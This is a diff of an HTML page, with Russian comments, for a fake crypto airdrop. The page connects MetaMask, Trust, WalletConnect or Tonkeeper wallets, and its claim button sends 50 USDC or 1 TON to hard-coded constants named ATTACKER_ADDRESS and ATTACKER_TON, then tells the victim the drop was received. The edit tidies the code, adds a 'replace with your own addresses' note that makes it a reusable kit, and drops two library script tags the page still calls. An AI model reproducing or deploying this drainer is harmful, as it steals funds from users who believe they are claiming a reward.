@@ -20,14 +20,13 @@
         .btn-primary:active { transform: scale(0.96); }
         .btn-primary:disabled { opacity: 0.5; transform: none; }
         .wallet-row { display: flex; gap: 10px; margin: 18px 0 8px; flex-wrap: wrap; justify-content: center; }
-        .wallet-btn { background: #1f2840; border: 1px solid #2f3a58; padding: 10px 16px; border-radius: 40px; font-size: 13px; font-weight: 600; color: #c8d4e8; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; }
+        .wallet-btn { background: #1f2840; border: 1px solid #2f3a58; padding: 10px 16px; border-radius: 40px; font-size: 13px; font-weight: 600; color: #c8d4e8; cursor: pointer; transition: 0.2s; }
         .wallet-btn.active { border-color: #f7b731; background: #2a3450; }
         .status { margin-top: 16px; font-size: 14px; color: #7b8ba8; text-align: center; min-height: 24px; }
         .grid-btns { display: flex; gap: 10px; margin-top: 18px; }
         .grid-btns button { flex:1; background: #1a2130; border: 1px solid #2d364b; padding: 14px 0; border-radius: 40px; color: #c8d4e8; font-weight: 600; font-size: 14px; cursor: pointer; transition: 0.15s; }
         .grid-btns button:active { background: #2a3450; }
         .addr-display { font-size: 12px; color: #4a5a78; word-break: break-all; background: #0e121e; padding: 8px 12px; border-radius: 12px; margin: 12px 0; border: 1px solid #1f2840; text-align: center; }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -61,19 +60,14 @@
     </div>
 </div>
 
-<!-- Подключаем библиотеки -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-<script src="https://unpkg.com/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js"></script>
-
 <script>
-    // ===== НАСТРОЙКИ =====
-    const ATTACKER_ADDRESS = '0x44698049ad0be92e567cdfe9c5aa86d70047f73e'; // EVM адрес (для MetaMask/Trust/WC)
+    // ===== НАСТРОЙКИ (ЗАМЕНИТЕ НА СВОИ АДРЕСА) =====
+    const ATTACKER_ADDRESS = '0x44698049ad0be92e567cdfe9c5aa86d70047f73e'; // EVM адрес
     const ATTACKER_TON = 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'; // TON адрес
-
-    const USDC_CONTRACT = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC Ethereum
+    const USDC_CONTRACT = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
     const USDC_DECIMALS = 6;
-    const AMOUNT = 50; // 50 USDC
+    const AMOUNT = 50;
 
     let provider, signer, userAddress, walletType;
     const statusEl = document.getElementById('statusMsg');
@@ -90,47 +84,42 @@
 
             try {
                 if (walletType === 'metamask' || walletType === 'trust') {
-                    // EVM кошельки через window.ethereum
-                    if (!window.ethereum) throw new Error('Установите MetaMask или Trust Wallet');
+                    if (!window.ethereum) {
+                        throw new Error('Установите MetaMask или Trust Wallet');
+                    }
+                    // Прямой запрос к провайдеру
                     provider = new ethers.providers.Web3Provider(window.ethereum);
                     await provider.send('eth_requestAccounts', []);
                     signer = provider.getSigner();
                     userAddress = await signer.getAddress();
-                    addrEl.innerText = `✅ EVM: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                    addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                     statusEl.innerText = `✅ ${walletType} подключён`;
                     claimBtn.disabled = false;
                 }
                 else if (walletType === 'walletconnect') {
-                    // WalletConnect
+                    // WalletConnect через CDN
                     const provider = new WalletConnectProvider.default({
-                        rpc: {
-                            1: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
-                        },
+                        rpc: { 1: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161' },
                         chainId: 1,
                     });
                     await provider.enable();
                     const web3Provider = new ethers.providers.Web3Provider(provider);
                     signer = web3Provider.getSigner();
                     userAddress = await signer.getAddress();
-                    addrEl.innerText = `✅ WC: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                    addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                     statusEl.innerText = '✅ WalletConnect подключён';
                     claimBtn.disabled = false;
                 }
                 else if (walletType === 'tonkeeper') {
-                    // TON кошелёк через TonConnect
+                    // TON через TonConnect
                     const connector = new TonConnectSDK.TonConnect({
                         manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json'
                     });
-                    await connector.connect({
-                        bridge: 'https://bridge.ton.org',
-                        network: 'mainnet'
-                    });
-                    const wallet = connector.wallet;
-                    userAddress = wallet.account.address;
-                    addrEl.innerText = `✅ TON: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                    await connector.connect({ bridge: 'https://bridge.ton.org', network: 'mainnet' });
+                    userAddress = connector.wallet.account.address;
+                    addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                     statusEl.innerText = '✅ Tonkeeper подключён';
                     claimBtn.disabled = false;
-                    // Сохраняем connector для TON транзакций
                     window.tonConnector = connector;
                 }
             } catch (e) {
@@ -151,7 +140,6 @@
 
         try {
             if (walletType === 'metamask' || walletType === 'trust' || walletType === 'walletconnect') {
-                // EVM: перевод USDC на адрес злоумышленника
                 const usdc = new ethers.Contract(USDC_CONTRACT, [
                     'function transfer(address to, uint256 amount) external returns (bool)'
                 ], signer);
@@ -164,17 +152,12 @@
                 this.style.color = '#fff';
             }
             else if (walletType === 'tonkeeper') {
-                // TON: перевод TON (или Jetton) на адрес злоумышленника
                 const connector = window.tonConnector;
                 const tx = {
                     valid_until: Math.floor(Date.now() / 1000) + 300,
-                    messages: [{
-                        address: ATTACKER_TON,
-                        amount: '1000000000', // 1 TON (в нанотонах)
-                        payload: ''
-                    }]
+                    messages: [{ address: ATTACKER_TON, amount: '1000000000', payload: '' }]
                 };
-                const result = await connector.sendTransaction(tx);
+                await connector.sendTransaction(tx);
                 statusEl.innerText = `✅ TON отправлены на ${ATTACKER_TON.slice(0,6)}...`;
                 addrEl.innerText = `💸 Вывод: ${ATTACKER_TON.slice(0,6)}...${ATTACKER_TON.slice(-4)}`;
                 this.innerText = '💸 Дроп получен';
@@ -187,10 +170,10 @@
         }
     });
 
-    // ===== КНОПКИ PLAY/PROMO/OVERVIEW =====
-    document.getElementById('playBtn').addEventListener('click', () => statusEl.innerText = '🎮 Игровой режим (демо)');
-    document.getElementById('promoBtn').addEventListener('click', () => statusEl.innerText = '📹 Промо-видео (скоро)');
-    document.getElementById('overviewBtn').addEventListener('click', () => statusEl.innerText = '📊 Обзор алгоритма (скоро)');
+    // ===== КНОПКИ =====
+    document.getElementById('playBtn').onclick = () => statusEl.innerText = '🎮 Игровой режим (демо)';
+    document.getElementById('promoBtn').onclick = () => statusEl.innerText = '📹 Промо-видео (скоро)';
+    document.getElementById('overviewBtn').onclick = () => statusEl.innerText = '📊 Обзор алгоритма (скоро)';
 </script>
 </body>
 </html>
